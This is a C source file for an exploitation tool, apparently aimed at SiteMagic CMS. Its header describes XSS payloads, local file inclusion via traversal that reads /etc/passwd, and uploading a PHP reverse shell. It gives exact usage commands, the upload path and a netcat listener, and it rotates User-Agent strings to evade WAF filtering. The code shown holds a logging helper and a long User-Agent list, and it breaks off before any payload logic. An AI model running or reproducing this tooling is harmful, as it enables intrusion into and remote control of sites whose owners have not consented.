/*
 * Filename     : Magicx.c
 * Author       : Byte Reaper
 *
 * Description  :
 *   Mgicx SiteMagic Exploitation Tool: a unified Proof-of-Concept for three
 *   distinct vulnerabilities in SiteMagic CMS:
 *
 *     1) Cross-Site Scripting (XSS)
 *        - Inject payloads into dynamic SMExt parameter to detect/reflected XSS
 *        - Uses various obfuscation vectors and HTML/JS evasion techniques
 *
 *     2) Local File Inclusion (LFI)
 *        - Chains directory traversal patterns (../) with null-byte (%00) suffix
 *        - Attempts multiple encodings (URL, double-URL, simple obfuscation)
 *        - Detects "root:x:0:0" sequence in /etc/passwd to confirm success
 *
 *     3) Unrestricted File Upload (Authenticated File Upload)
 *        - Targets the SMFilesUpload endpoint allowing arbitrary PHP file upload
 *        - Builds multipart/form-data request to upload “php-reverse-shell.php”
 *        - After upload, user can invoke reverse shell via web-accessible path
 *
 *   The tool automates:
 *     • Rotating User-Agent strings to evade basic filters
 *     • Logging all attempts (with timestamps) to “MagicX.log”
 *     • HTTP response code checks to infer success or failure
 *
 * Usage:
 *     gcc Magicx.c argparse.c -o Magicx -lcurl
 *
 *     1) Exploit XSS:
 *        sudo ./Magicx -u http://target.com/index.php?SMExt= -x
 *
 *     2) Exploit LFI:
 *        sudo ./Magicx -u http://target.com -f
 *
 *     3) Exploit File Upload:
 *        sudo ./Magicx -u http://target.com -p
 *        (Ensure “php-reverse-shell.php” exists in the working directory)
 *
 *   Example:
 *     ./Magicx -u http://vulnsite.com -p
 *     # Prompts user to prepare “php-reverse-shell.php” in cwd, then uploads it:
 *     # http://vulnsite.com/sitemagic/index.php?SMExt=SMFiles&SMTemplateType=Basic
 *     #   &SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath=files%2Fimages
 *
 * Warning:
 *   – Intended strictly for educational/research use. Unauthorized scanning or
 *     exploitation is illegal and unethical.
 *   – Always test against a local/lab instance of SiteMagic CMS.
 *
 * Dependencies:
 *   – libcurl (for HTTP requests)
 *   – argparse.h (for command-line parsing)
 *
 * Notes:
 *   – Logging function appends timestamps (UTC) to MagicX.log.
 *   – Rotate User-Agent per request to minimize simple WAF blocking.
 *   – After successful File Upload, navigate to:
 *         http://<target>/sitemagic/files/images/php-reverse-shell.php
 *     then listen with netcat (e.g., nc -lvnp 1234).
 *
 *   – For LFI, inspect console for “Possible LFI success detected” message.
 *   – For XSS, inspect output logs for reflected payload match.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <string.h>
#include "argparse.h"

//Function to create the log file and record the stages of the tool's movements
void log_file(const char *meSS)
{
    FILE *file = fopen("MagicX.log", "a"); 

    if (!file)
    {
        fprintf(stderr, "[-] Error Open Log File !!\n"); 

    }
    time_t noW =time(NULL); 

    char *t = ctime(&noW);

    t[strlen(t) - 1] = '\0';
    fprintf(file,
        "[%s] %s\n",
        t,
        meSS);

    fclose(file);

}

typedef struct {
    char *buffer;
    size_t len;
} Mem;
// SaVe Response Server
size_t write_cb(void *ptr,
    size_t size,
    size_t nmemb,
    void *userdata) 
{
    size_t total = size * nmemb;
    Mem *m = (Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (!tmp) return 0;
    m->buffer = tmp;
    memcpy(m->buffer + m->len, ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}

//Function to send browser identification headers in requests to prevent blocking
void sendAgents(CURL *curl)
{

    //You can add as many headers as you want without modifying the widget logic.
    char *agents[] = 
    { 
        
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
        "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
        "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
        "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
        "Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
        "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",
        "Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
        "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko",
        "Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/7.1.5 Safari/537.85.14",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8",
        "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
        "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/7.1.2 Safari/537.85.11",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.5 Safari/534.34",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b",
        "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
        "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (X11; CrOS x86_64 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/7.1.4 Safari/537.85.13",
        "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
        "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12F69 Safari/600.1.4",
        "Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0",
